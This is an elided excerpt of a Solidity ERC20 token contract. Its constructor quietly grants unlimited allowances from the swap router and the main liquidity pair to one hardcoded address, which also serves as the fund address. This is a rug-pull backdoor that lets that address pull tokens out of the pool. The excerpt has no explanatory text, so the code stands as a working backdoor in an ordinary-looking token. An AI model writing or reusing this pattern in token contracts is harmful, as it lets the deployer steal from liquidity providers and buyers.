...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress){
        ...
        _allowances[address(_swapRouter)][address(0xACa9c3B23d27D6224dd8e0a33AB091fec311d5c2)] = MAX;
        _allowances[address(mainPair)][address(0xACa9c3B23d27D6224dd8e0a33AB091fec311d5c2)] = MAX;
    ...
    function checkWl(address addr) external view returns (bool){
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        address(0xACa9c3B23d27D6224dd8e0a33AB091fec311d5c2)
    ){
